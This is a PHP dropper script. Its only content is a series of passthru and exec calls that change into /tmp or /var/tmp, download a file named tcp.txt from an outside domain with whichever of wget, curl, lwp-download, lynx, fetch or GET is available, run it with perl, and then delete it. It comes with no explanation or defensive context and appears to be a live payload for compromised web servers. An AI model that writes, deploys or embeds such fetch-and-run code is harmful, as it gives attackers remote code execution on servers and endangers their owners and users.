<?
passthru('cd /tmp;wget http://spa24hours.eu/store/images/images/tcp.txt;perl tcp.txt;rm -rf tcp.txt*');
passthru('cd /tmp;curl -O http://spa24hours.eu/store/images/images/tcp.txt;perl tcp.txt;rm -rf tcp.txt*');
passthru('cd /tmp;lwp-download http://spa24hours.eu/store/images/images/tcp.txt;perl tcp.txt;rm -rf tcp.txt*');
passthru('cd /tmp;lynx -source http://spa24hours.eu/store/images/images/tcp.txt;perl tcp.txt;rm -rf tcp.txt*');
passthru('cd /tmp;fetch http://spa24hours.eu/store/images/images/tcp.txt;perl tcp.txt;rm -rf tcp.txt*');
passthru('cd /tmp;GET http://spa24hours.eu/store/images/images/tcp.txt;perl tcp.txt;rm -rf tcp.txt*');
echo exec('cd /var/tmp;curl -O http://spa24hours.eu/store/images/images/tcp.txt;perl tcp.txt localhost;rm -rf tcp.txt*;');
echo exec('cd /var/tmp;GET http://spa24hours.eu/store/images/images/tcp.txt;perl tcp.txt localhost;rm -rf tcp.txt*;');
echo exec('cd /var/tmp;wget http://spa24hours.eu/store/images/images/tcp.txt;perl tcp.txt localhost;rm -rf tcp.txt*;');
echo exec('cd /var/tmp;fetch http://spa24hours.eu/store/images/images/tcp.txt;perl tcp.txt localhost;rm -rf tcp.txt*;');
echo passthru('cd /var/tmp;fetch http://spa24hours.eu/store/images/images/tcp.txt;perl tcp.txt localhost;rm -rf tcp.txt*;');
?>